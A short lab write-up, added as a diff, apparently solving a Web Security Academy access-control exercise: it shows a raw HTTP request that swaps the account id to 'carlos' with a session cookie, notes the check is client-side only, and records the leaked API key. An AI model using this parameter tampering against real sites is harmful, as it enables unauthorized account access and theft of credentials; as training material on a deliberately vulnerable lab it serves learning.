@@ -1,0 +1,19 @@
+Via this reqest 
+GET /my-account?id=carlos HTTP/2
+Host: 0aa9009803349f10822d7fd7004c00bb.web-security-academy.net
+Cookie: session=3M509fSydtPjFbyMgWIjhcFNdp3tMRCo
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0aa9009803349f10822d7fd7004c00bb.web-security-academy.net/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+The restrection is on the client side only not thee server side so the response in burp has the API key for user carlos
+
+Api key : W7Tnofi5D9EjS0PSl3lHst7I4lUZilbd
